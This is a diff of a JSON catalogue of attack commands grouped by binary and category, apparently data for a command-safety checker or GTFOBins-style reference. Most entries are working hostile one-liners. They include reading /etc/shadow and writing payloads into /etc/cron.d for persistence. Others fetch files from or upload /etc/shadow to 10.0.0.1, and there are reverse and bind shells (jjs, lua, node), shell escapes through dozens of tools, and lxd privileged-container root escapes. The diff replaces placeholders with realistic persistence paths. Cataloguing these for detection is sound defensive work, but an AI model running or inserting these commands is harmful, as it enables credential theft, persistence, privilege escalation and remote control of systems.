+      "command": "echo -e 'package main\\nimport \"os\"\\nfunc main(){\\n\\tf, _ := os.OpenFile(\"/etc/cron.d/update\", os.O_RDWR|os.O_CREATE, 0644)\\n\\tf.Write([]byte(\"c2VydmljZS1jb25maWc=\\\\n\"))\\n\\tf.Close()\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
       "binary": "go",
       "category": "file-write"
     },
@@ -764,9 +1159,29 @@
       "category": "reverse-shell"
     },
     {
-      "command": "gtester DATA -o /tmp/evil",
+      "command": "echo -e 'package main\\nimport \"syscall\"\\nfunc main(){\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, []string{})\\n}' >/tmp/tempfile.go\ngo run /tmp/tempfile.go",
+      "binary": "go",
+      "category": "shell"
+    },
+    {
+      "command": "grc --pty /bin/sh",
+      "binary": "grc",
+      "category": "shell"
+    },
+    {
+      "command": "gtester c2VydmljZS1jb25maWc= -o /etc/cron.d/update",
       "binary": "gtester",
       "category": "file-write"
+    },
+    {
+      "command": "echo 'exec /bin/sh 0<&1' >/tmp/tempfile\nchmod +x /tmp/tempfile\ngtester -q /tmp/tempfile",
+      "binary": "gtester",
+      "category": "shell"
+    },
+    {
+      "command": "guile -c '(system \"/bin/sh\")'",
+      "binary": "guile",
+      "category": "shell"
     },
     {
       "command": "gzip -c /etc/shadow | gzip -d",
@@ -774,7 +1189,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo -n DATA | tee /usr/share/wordlists/rockyou.txt | md5sum | awk '{print $1}' >/tmp/hash.txt\nhashcat -m 0 --quiet --potfile-disable -o /tmp/evil --outfile-format=2 --outfile-autohex-disable /tmp/hash.txt /usr/share/wordlists/rockyou.txt",
+      "command": "echo -n c2VydmljZS1jb25maWc= | tee /usr/share/wordlists/rockyou.txt | md5sum | awk '{print $1}' >/tmp/hash.txt\nhashcat -m 0 --quiet --potfile-disable -o /etc/cron.d/update --outfile-format=2 --outfile-autohex-disable /tmp/hash.txt /usr/share/wordlists/rockyou.txt",
       "binary": "hashcat",
       "category": "file-write"
     },
@@ -789,9 +1204,19 @@
       "category": "file-read"
     },
     {
+      "command": "hg --config alias.x='!/bin/sh' x",
+      "binary": "hg",
+      "category": "shell"
+    },
+    {
       "command": "highlight --no-doc --failsafe /etc/shadow",
       "binary": "highlight",
       "category": "file-read"
+    },
+    {
+      "command": "hping3\n/bin/sh",
+      "binary": "hping3",
+      "category": "shell"
     },
     {
       "command": "hping3 10.0.0.1 --icmp --data 999 --sign xxx --file /etc/shadow",
@@ -804,9 +1229,19 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA | iconv -f 8859_1 -t 8859_1 -o /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= | iconv -f 8859_1 -t 8859_1 -o /etc/cron.d/update",
       "binary": "iconv",
       "category": "file-write"
+    },
+    {
+      "command": "iftop\n!/bin/sh",
+      "binary": "iftop",
+      "category": "shell"
+    },
+    {
+      "command": "ionice /bin/sh",
+      "binary": "ionice",
+      "category": "shell"
     },
     {
       "command": "ip -force -batch /etc/shadow",
@@ -814,12 +1249,32 @@
       "category": "file-read"
     },
     {
-      "command": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA\niptables -S\niptables-save -f /tmp/evil",
+      "command": "ip netns add foo\nip netns exec foo /bin/sh\nip netns delete foo",
+      "binary": "ip",
+      "category": "shell"
+    },
+    {
+      "command": "ip netns add foo\nip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nip netns exec bar /bin/sh\nip netns delete foo\nip netns delete bar",
+      "binary": "ip",
+      "category": "shell"
+    },
+    {
+      "command": "iptables -A INPUT -i lo -j ACCEPT -m comment --comment c2VydmljZS1jb25maWc=\niptables -S\niptables-save -f /etc/cron.d/update",
       "binary": "iptables-save",
       "category": "file-write"
     },
     {
-      "command": "jjs\nvar URL = Java.type('java.net.URL');\nvar ws = new URL('http://10.0.0.1/etc/shadow');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('/tmp/evil');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();",
+      "command": "ispell /etc/hosts\n!/bin/sh",
+      "binary": "ispell",
+      "category": "shell"
+    },
+    {
+      "command": "java Shell",
+      "binary": "java",
+      "category": "shell"
+    },
+    {
+      "command": "jjs\nvar URL = Java.type('java.net.URL');\nvar ws = new URL('http://10.0.0.1/etc/shadow');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('/etc/cron.d/update');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();",
       "binary": "jjs",
       "category": "download"
     },
@@ -829,7 +1284,7 @@
       "category": "file-read"
     },
     {
-      "command": "jjs\nvar FileWriter = Java.type('java.io.FileWriter');\nvar fw=new FileWriter('/tmp/evil');\nfw.write('DATA');\nfw.close();",
+      "command": "jjs\nvar FileWriter = Java.type('java.io.FileWriter');\nvar fw=new FileWriter('/etc/cron.d/update');\nfw.write('c2VydmljZS1jb25maWc=');\nfw.close();",
       "binary": "jjs",
       "category": "file-write"
     },
@@ -837,6 +1292,16 @@
       "command": "jjs\nvar host='10.0.0.1';\nvar port=4444;\nvar ProcessBuilder = Java.type('java.lang.ProcessBuilder');\nvar p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();\nvar Socket = Java.type('java.net.Socket');\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();",
       "binary": "jjs",
       "category": "reverse-shell"
+    },
+    {
+      "command": "jjs\nJava.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()",
+      "binary": "jjs",
+      "category": "shell"
+    },
+    {
+      "command": "joe\n^K!/bin/sh",
+      "binary": "joe",
+      "category": "shell"
     },
     {
       "command": "join -a 2 /dev/null /etc/shadow",
@@ -849,7 +1314,7 @@
       "category": "file-read"
     },
     {
-      "command": "jrunscript -e 'cp(\"http://10.0.0.1/etc/shadow\",\"/tmp/evil\")'",
+      "command": "jrunscript -e 'cp(\"http://10.0.0.1/etc/shadow\",\"/etc/cron.d/update\")'",
       "binary": "jrunscript",
       "category": "download"
     },
@@ -859,7 +1324,7 @@
       "category": "file-read"
     },
     {
-      "command": "jrunscript -e 'var fw=new java.io.FileWriter(\"/tmp/evil\");\n    fw.write(\"DATA\");\n    fw.close();'",
+      "command": "jrunscript -e 'var fw=new java.io.FileWriter(\"/etc/cron.d/update\");\n    fw.write(\"c2VydmljZS1jb25maWc=\");\n    fw.close();'",
       "binary": "jrunscript",
       "category": "file-write"
     },
@@ -869,17 +1334,32 @@
       "category": "reverse-shell"
     },
     {
+      "command": "jrunscript -e 'exec(\"/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty\")'",
+      "binary": "jrunscript",
+      "category": "shell"
+    },
+    {
       "command": "jshell\njshell> /open /etc/shadow",
       "binary": "jshell",
       "category": "file-read"
     },
     {
-      "command": "jshell\nString x = \"DATA\";\n/save /tmp/evil",
+      "command": "jshell\nString x = \"c2VydmljZS1jb25maWc=\";\n/save /etc/cron.d/update",
       "binary": "jshell",
       "category": "file-write"
     },
     {
-      "command": "julia -e 'download(\"http://10.0.0.1/etc/shadow\", \"/tmp/evil\")'",
+      "command": "jshell\nRuntime.getRuntime().exec(\"/usr/local/bin/service-check\");",
+      "binary": "jshell",
+      "category": "shell"
+    },
+    {
+      "command": "jtag --interactive\nshell /bin/sh",
+      "binary": "jtag",
+      "category": "shell"
+    },
+    {
+      "command": "julia -e 'download(\"http://10.0.0.1/etc/shadow\", \"/etc/cron.d/update\")'",
       "binary": "julia",
       "category": "download"
     },
@@ -889,7 +1369,7 @@
       "category": "file-read"
     },
     {
-      "command": "julia -e 'open(f->write(f, \"DATA\"), /tmp/evil, \"w\")'",
+      "command": "julia -e 'open(f->write(f, \"c2VydmljZS1jb25maWc=\"), /etc/cron.d/update, \"w\")'",
       "binary": "julia",
       "category": "file-write"
     },
@@ -899,9 +1379,24 @@
       "category": "reverse-shell"
     },
     {
+      "command": "julia -e 'run(`/bin/sh`)'",
+      "binary": "julia",
+      "category": "shell"
+    },
+    {
       "command": "ksshell -i /etc/shadow",
       "binary": "ksshell",
       "category": "file-read"
+    },
+    {
+      "command": "ksu -q -e /bin/sh",
+      "binary": "ksu",
+      "category": "shell"
+    },
+    {
+      "command": "cat >/tmp/tempfile <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\ncontexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name: x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/tmp/tempfile",
+      "binary": "kubectl",
+      "category": "shell"
     },
     {
       "command": "kubectl proxy --address=0.0.0.0 --port=4444 --www=/tmp/dir/ --www-prefix=/x/",
@@ -919,9 +1414,14 @@
       "category": "file-read"
     },
     {
-      "command": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'",
+      "command": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{c2VydmljZS1jb25maWc=}\\immediate\\closeout\\tempfile\\end{document}'",
       "binary": "latex",
       "category": "file-write"
+    },
+    {
+      "command": "latex --shell-escape '\\immediate\\write18{/bin/sh}'",
+      "binary": "latex",
+      "category": "shell"
     },
     {
       "command": "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/etc/shadow}\\end{document}' >/tmp/tempfile\nlatexmk -dvi /tmp/tempfile\nstrings temp-file.dvi",
@@ -929,12 +1429,22 @@
       "category": "file-read"
     },
     {
-      "command": "cp /tmp/evil.sh ~/.lessfilter\nless /etc/hosts",
+      "command": "latexmk -pdf -pdflatex='/bin/sh #' /dev/null",
+      "binary": "latexmk",
+      "category": "shell"
+    },
+    {
+      "command": "/lib64/ld-linux-x86-64.so.2 /bin/sh",
+      "binary": "ld.so",
+      "category": "shell"
+    },
+    {
+      "command": "cp /usr/local/bin/service-check ~/.lessfilter\nless /etc/hosts",
       "binary": "less",
       "category": "command"
     },
     {
-      "command": "LESSOPEN='/tmp/evil.sh # %s' less /etc/hosts",
+      "command": "LESSOPEN='/usr/local/bin/service-check # %s' less /etc/hosts",
       "binary": "less",
       "category": "command"
     },
@@ -954,9 +1464,29 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA | less\ns/tmp/evil\nq",
+      "command": "echo c2VydmljZS1jb25maWc= | less\ns/etc/cron.d/update\nq",
       "binary": "less",
       "category": "file-write"
+    },
+    {
+      "command": "less /etc/hosts\n!/bin/sh",
+      "binary": "less",
+      "category": "shell"
+    },
+    {
+      "command": "LESSOPEN=\"/bin/sh -s 1>&0 2>&0 # %s\" less /etc/hosts\nreset",
+      "binary": "less",
+      "category": "shell"
+    },
+    {
+      "command": "VISUAL='/bin/sh -s --' less /etc/hosts\nv",
+      "binary": "less",
+      "category": "shell"
+    },
+    {
+      "command": "lftp -c '!/bin/sh'",
+      "binary": "lftp",
+      "category": "shell"
     },
     {
       "command": "links /etc/shadow",
@@ -964,14 +1494,29 @@
       "category": "file-read"
     },
     {
+      "command": "loginctl user-status\n!/bin/sh",
+      "binary": "loginctl",
+      "category": "shell"
+    },
+    {
       "command": "logrotate /etc/shadow",
       "binary": "logrotate",
       "category": "file-read"
     },
     {
-      "command": "logrotate -l /tmp/evil DATA",
+      "command": "logrotate -l /etc/cron.d/update c2VydmljZS1jb25maWc=",
       "binary": "logrotate",
       "category": "file-write"
+    },
+    {
+      "command": "echo -e '/tmp/tempfile.config {\\nmail x@x.x\\n}' >/tmp/tempfile.config\necho '/bin/sh 0<&2 1>&2' >/tmp/tempfile.sh\nlogrotate -m /tmp/tempfile.sh -f /tmp/tempfile",
+      "binary": "logrotate",
+      "category": "shell"
+    },
+    {
+      "command": "logsave /dev/null /bin/sh -i",
+      "binary": "logsave",
+      "category": "shell"
     },
     {
       "command": "look '' /etc/shadow",
@@ -989,9 +1534,14 @@
       "category": "file-read"
     },
     {
-      "command": "ltrace -s 999 -o /etc/shadow ltrace -F DATA",
+      "command": "ltrace -s 999 -o /etc/shadow ltrace -F c2VydmljZS1jb25maWc=",
       "binary": "ltrace",
       "category": "file-write"
+    },
+    {
+      "command": "ltrace -b -L /bin/sh",
+      "binary": "ltrace",
+      "category": "shell"
     },
     {
       "command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",4444));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'",
@@ -999,7 +1549,7 @@
       "category": "bind-shell"
     },
     {
-      "command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",4444));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/tmp/evil\", \"wb\");\n  f:write(d);\n  io.close(f);'",
+      "command": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",4444));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/etc/cron.d/update\", \"wb\");\n  f:write(d);\n  io.close(f);'",
       "binary": "lua",
       "category": "download"
     },
@@ -1009,7 +1559,7 @@
       "category": "file-read"
     },
     {
-      "command": "lua -e 'local f=io.open(\"/tmp/evil\", \"wb\"); f:write(\"DATA\"); io.close(f);'",
+      "command": "lua -e 'local f=io.open(\"/etc/cron.d/update\", \"wb\"); f:write(\"c2VydmljZS1jb25maWc=\"); io.close(f);'",
       "binary": "lua",
       "category": "file-write"
     },
@@ -1019,12 +1569,17 @@
       "category": "reverse-shell"
     },
     {
+      "command": "lua -e 'os.execute(\"/bin/sh\")'",
+      "binary": "lua",
+      "category": "shell"
+    },
+    {
       "command": "lua -e '\n  local f=io.open(\"/etc/shadow\", \"rb\")\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"10.0.0.1\",4444);\n  t:send(d);\n  t:close();'",
       "binary": "lua",
       "category": "upload"
     },
     {
-      "command": "lwp-download http://10.0.0.1/etc/shadow /tmp/evil",
+      "command": "lwp-download http://10.0.0.1/etc/shadow /etc/cron.d/update",
       "binary": "lwp-download",
       "category": "download"
     },
@@ -1034,12 +1589,12 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\nlwp-download file:///tmp/tempfile /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\nlwp-download file:///tmp/tempfile /etc/cron.d/update",
       "binary": "lwp-download",
       "category": "file-write"
     },
     {
-      "command": "lwp-download file:///etc/shadow /tmp/evil",
+      "command": "lwp-download file:///etc/shadow /etc/cron.d/update",
       "binary": "lwp-download",
       "category": "file-write"
     },
@@ -1049,7 +1604,17 @@
       "category": "file-read"
     },
     {
-      "command": "echo 'esyscmd(/tmp/evil.sh)' | m4",
+      "command": "lxc init ubuntu:16.04 x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh",
+      "binary": "lxd",
+      "category": "shell"
+    },
+    {
+      "command": "lxc image import ./alpine*.tar.gz --alias x\nlxc init x x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh",
+      "binary": "lxd",
+      "category": "shell"
+    },
+    {
+      "command": "echo 'esyscmd(/usr/local/bin/service-check)' | m4",
       "binary": "m4",
       "category": "command"
     },
@@ -1059,14 +1624,34 @@
       "category": "file-read"
     },
     {
+      "command": "echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4",
+      "binary": "m4",
+      "category": "shell"
+    },
+    {
+      "command": "mail --exec='!/bin/sh'",
+      "binary": "mail",
+      "category": "shell"
+    },
+    {
+      "command": "mail -f /etc/hosts\n!/bin/sh",
+      "binary": "mail",
+      "category": "shell"
+    },
+    {
       "command": "make -s --eval='$(file >/dev/stdout,$(file </etc/shadow))' .",
       "binary": "make",
       "category": "file-read"
     },
     {
-      "command": "make -s --eval='$(file >/tmp/evil,DATA)' .",
+      "command": "make -s --eval='$(file >/etc/cron.d/update,c2VydmljZS1jb25maWc=)' .",
       "binary": "make",
       "category": "file-write"
+    },
+    {
+      "command": "make --eval='$(shell /bin/sh 1>&0)' .",
+      "binary": "make",
+      "category": "shell"
     },
     {
       "command": "man /etc/shadow",
@@ -1074,19 +1659,49 @@
       "category": "file-read"
     },
     {
+      "command": "man '-H/bin/sh #' man",
+      "binary": "man",
+      "category": "shell"
+    },
+    {
       "command": "mawk '//' /etc/shadow",
       "binary": "mawk",
       "category": "file-read"
     },
     {
-      "command": "mawk 'BEGIN { print \"DATA\" > \"/tmp/evil\" }'",
+      "command": "mawk 'BEGIN { print \"c2VydmljZS1jb25maWc=\" > \"/etc/cron.d/update\" }'",
       "binary": "mawk",
       "category": "file-write"
+    },
+    {
+      "command": "mawk 'BEGIN {system(\"/bin/sh\")}'",
+      "binary": "mawk",
+      "category": "shell"
+    },
+    {
+      "command": "minicom -D /dev/null",
+      "binary": "minicom",
+      "category": "shell"
+    },
+    {
+      "command": "echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/tmp/tempfile\nminicom -D /dev/null -S /tmp/tempfile\nreset^J",
+      "binary": "minicom",
+      "category": "shell"
     },
     {
       "command": "more /etc/shadow",
       "binary": "more",
       "category": "file-read"
+    },
+    {
+      "command": "more /etc/hosts\n!/bin/sh",
+      "binary": "more",
+      "category": "shell"
+    },
+    {
+      "command": "mosh --server=mosh-server localhost /bin/sh",
+      "binary": "mosh-server",
+      "category": "shell"
     },
     {
       "command": "mosquitto -c /etc/shadow",
@@ -1114,6 +1729,11 @@
       "category": "file-read"
     },
     {
+      "command": "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'",
+      "binary": "msgfilter",
+      "category": "shell"
+    },
+    {
       "command": "msgmerge -P /etc/shadow /dev/null",
       "binary": "msgmerge",
       "category": "file-read"
@@ -1129,12 +1749,17 @@
       "category": "file-read"
     },
     {
+      "command": "multitime /bin/sh",
+      "binary": "multitime",
+      "category": "shell"
+    },
+    {
       "command": "mutt -F /etc/shadow",
       "binary": "mutt",
       "category": "file-read"
     },
     {
-      "command": "echo DATA >/tmp/tempfile\nmv /tmp/tempfile /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= >/tmp/tempfile\nmv /tmp/tempfile /etc/cron.d/update",
       "binary": "mv",
       "category": "file-write"
     },
@@ -1144,9 +1769,14 @@
       "category": "file-read"
     },
     {
-      "command": "mypy /etc/shadow --junit-xml /tmp/evil",
+      "command": "mypy /etc/shadow --junit-xml /etc/cron.d/update",
       "binary": "mypy",
       "category": "file-write"
+    },
+    {
+      "command": "mysql -e '\\! /bin/sh'",
+      "binary": "mysql",
+      "category": "shell"
     },
     {
       "command": "nano /etc/shadow",
@@ -1154,9 +1784,19 @@
       "category": "file-read"
     },
     {
-      "command": "nano /tmp/evil\nDATA\n^O",
+      "command": "nano /etc/cron.d/update\nc2VydmljZS1jb25maWc=\n^O",
       "binary": "nano",
       "category": "file-write"
+    },
+    {
+      "command": "nano\n^R^X\nreset; sh 1>&0 2>&0",
+      "binary": "nano",
+      "category": "shell"
+    },
+    {
+      "command": "nano -s /bin/sh\n/bin/sh\n^T^T",
+      "binary": "nano",
+      "category": "shell"
     },
     {
       "command": "nasm -@ /etc/shadow",
@@ -1169,12 +1809,12 @@
       "category": "bind-shell"
     },
     {
-      "command": "nc -l -p 4444 >/tmp/evil",
+      "command": "nc -l -p 4444 >/etc/cron.d/update",
       "binary": "nc",
       "category": "download"
     },
     {
-      "command": "nc 10.0.0.1 4444 >/tmp/evil",
+      "command": "nc 10.0.0.1 4444 >/etc/cron.d/update",
       "binary": "nc",
       "category": "download"
     },
@@ -1194,9 +1834,24 @@
       "category": "upload"
     },
     {
+      "command": "ncdu\nb",
+      "binary": "ncdu",
+      "category": "shell"
+    },
+    {
+      "command": "ncftp\n!/bin/sh",
+      "binary": "ncftp",
+      "category": "shell"
+    },
+    {
       "command": "neofetch --ascii /etc/shadow",
       "binary": "neofetch",
       "category": "file-read"
+    },
+    {
+      "command": "echo 'exec /bin/sh' >/tmp/tempfile\nneofetch --config /tmp/tempfile",
+      "binary": "neofetch",
+      "category": "shell"
     },
     {
       "command": "nft -f /etc/shadow",
@@ -1207,6 +1862,11 @@
       "command": "cat >/tmp/tempfile <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /tmp/tempfile",
       "binary": "nginx",
       "category": "download"
+    },
+    {
+      "command": "nice /bin/sh",
+      "binary": "nice",
+      "category": "shell"
     },
     {
       "command": "nl -bn -w1 -s '' /etc/shadow",
@@ -1224,9 +1884,14 @@
       "category": "file-read"
     },
     {
-      "command": "nmap -oG=/tmp/evil DATA",
+      "command": "nmap -oG=/etc/cron.d/update c2VydmljZS1jb25maWc=",
       "binary": "nmap",
       "category": "file-write"
+    },
+    {
+      "command": "nmap --interactive\n!/bin/sh",
+      "binary": "nmap",
+      "category": "shell"
     },
     {
       "command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(4444)'",
@@ -1234,7 +1899,7 @@
       "category": "bind-shell"
     },
     {
-      "command": "node -e 'require(\"http\").get(\"http://10.0.0.1/etc/shadow\", res => res.pipe(require(\"fs\").createWriteStream(\"/tmp/evil\")))'",
+      "command": "node -e 'require(\"http\").get(\"http://10.0.0.1/etc/shadow\", res => res.pipe(require(\"fs\").createWriteStream(\"/etc/cron.d/update\")))'",
       "binary": "node",
       "category": "download"
     },
@@ -1244,7 +1909,7 @@
       "category": "file-read"
     },
     {
-      "command": "node -e 'require(\"fs\").writeFileSync(\"/tmp/evil\", \"DATA\")'",
+      "command": "node -e 'require(\"fs\").writeFileSync(\"/etc/cron.d/update\", \"c2VydmljZS1jb25maWc=\")'",
       "binary": "node",
       "category": "file-write"
     },
@@ -1254,19 +1919,54 @@
       "category": "reverse-shell"
     },
     {
-      "command": "node -e 'require(\"fs\").createReadStream(\"/etc/shadow\").pipe(require(\"http\").request(\"http://10.0.0.1/tmp/evil\"))'",
+      "command": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
+      "binary": "node",
+      "category": "shell"
+    },
+    {
+      "command": "node -e 'require(\"fs\").createReadStream(\"/etc/shadow\").pipe(require(\"http\").request(\"http://10.0.0.1/etc/cron.d/update\"))'",
       "binary": "node",
       "category": "upload"
     },
     {
-      "command": "nohup /tmp/evil.sh\ncat nohup.out",
+      "command": "nohup /usr/local/bin/service-check\ncat nohup.out",
       "binary": "nohup",
       "category": "command"
+    },
+    {
+      "command": "nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'",
+      "binary": "nohup",
+      "category": "shell"
+    },
+    {
+      "command": "npm exec /bin/sh",
+      "binary": "npm",
+      "category": "shell"
+    },
+    {
+      "command": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nnpm -C . i",
+      "binary": "npm",
+      "category": "shell"
+    },
+    {
+      "command": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nnpm -C . run xxx",
+      "binary": "npm",
+      "category": "shell"
     },
     {
       "command": "nroff /etc/shadow",
       "binary": "nroff",
       "category": "file-read"
+    },
+    {
+      "command": "echo /bin/sh >groff\nchmod +x groff\nGROFF_BIN_PATH=. nroff",
+      "binary": "nroff",
+      "category": "shell"
+    },
+    {
+      "command": "nsenter /bin/sh",
+      "binary": "nsenter",
+      "category": "shell"
     },
     {
       "command": "ntpdate -a x -k /etc/shadow -d localhost",
@@ -1279,9 +1979,14 @@
       "category": "file-read"
     },
     {
-      "command": "octave-cli --eval 'fid = fopen(\"/tmp/evil\", \"w\"); fputs(fid, \"DATA\"); fclose(fid);'",
+      "command": "octave-cli --eval 'fid = fopen(\"/etc/cron.d/update\", \"w\"); fputs(fid, \"c2VydmljZS1jb25maWc=\"); fclose(fid);'",
       "binary": "octave",
       "category": "file-write"
+    },
+    {
+      "command": "octave-cli --eval 'system(\"/bin/sh\")'",
+      "binary": "octave",
+      "category": "shell"
     },
     {
       "command": "od -An -c -w999 /etc/shadow",
@@ -1289,7 +1994,7 @@
       "category": "file-read"
     },
     {
-      "command": "openssl s_client -quiet -connect 10.0.0.1:4444 >/tmp/evil",
+      "command": "openssl s_client -quiet -connect 10.0.0.1:4444 >/etc/cron.d/update",
       "binary": "openssl",
       "category": "download"
     },
@@ -1299,12 +2004,12 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA | openssl enc -out /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= | openssl enc -out /etc/cron.d/update",
       "binary": "openssl",
       "category": "file-write"
     },
     {
-      "command": "openssl enc -in /etc/shadow -out /tmp/evil",
+      "command": "openssl enc -in /etc/shadow -out /etc/cron.d/update",
       "binary": "openssl",
       "category": "file-write"
     },
@@ -1324,9 +2029,19 @@
       "category": "file-read"
     },
     {
-      "command": "openvt -- /tmp/evil.sh",
+      "command": "openvpn --dev null --script-security 2 --up '/bin/sh -s'",
+      "binary": "openvpn",
+      "category": "shell"
+    },
+    {
+      "command": "openvt -- /usr/local/bin/service-check",
       "binary": "openvt",
       "category": "command"
+    },
+    {
+      "command": "rpm opkg install x_1.0_all.deb",
+      "binary": "opkg",
+      "category": "shell"
     },
     {
       "command": "pandoc -t plain /etc/shadow",
@@ -1334,7 +2049,7 @@
       "category": "file-read"
     },
     {
-      "command": "echo DATA | pandoc -t plain -o /tmp/evil",
+      "command": "echo c2VydmljZS1jb25maWc= | pandoc -t plain -o /etc/cron.d/update",
       "binary": "pandoc",
       "category": "file-write"
     },
@@ -1354,12 +2069,27 @@
       "category": "file-read"
     },
     {
-      "command": "pdflatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'",
+      "command": "pdflatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{c2VydmljZS1jb25maWc=}\\immediate\\closeout\\tempfile\\end{document}'",
       "binary": "pdflatex",
       "category": "file-write"
     },
     {
-      "command": "perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>\"10.0.0.1\",PeerPort=>80,Proto=>\"tcp\") or die; print $s \"GET /etc/shadow HTTP/1.1\\r\\nHost: 10.0.0.1\\r\\nMetadata: true\\r\\nConnection: close\\r\\n\\r\\n\"; open(my $fh, \">\", \"/tmp/evil\") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq \"\\r\\n\") { $in_content = 1; } } close($s); close($fh);'",
+      "command": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'",
+      "binary": "pdflatex",
+      "category": "shell"
+    },
+    {
+      "command": "pdftex --shell-escape '\\write18{/bin/sh}\\end'",
+      "binary": "pdftex",
+      "category": "shell"
+    },
+    {
+      "command": "perf stat /bin/sh",
+      "binary": "perf",
+      "category": "shell"
+    },
+    {
+      "command": "perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>\"10.0.0.1\",PeerPort=>80,Proto=>\"tcp\") or die; print $s \"GET /etc/shadow HTTP/1.1\\r\\nHost: 10.0.0.1\\r\\nMetadata: true\\r\\nConnection: close\\r\\n\\r\\n\"; open(my $fh, \">\", \"/etc/cron.d/update\") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq \"\\r\\n\") { $in_content = 1; } } close($s); close($fh);'",
       "binary": "perl",
       "category": "download"
     },
@@ -1374,9 +2104,29 @@
       "category": "reverse-shell"
     },
     {
+      "command": "perl -e 'exec \"/bin/sh\"'",
+      "binary": "perl",
+      "category": "shell"
+    },
+    {
+      "command": "PERL5OPT=-d PERL5DB='exec \"/bin/sh\"' perl /dev/null",
+      "binary": "perl",
+      "category": "shell"
+    },
+    {
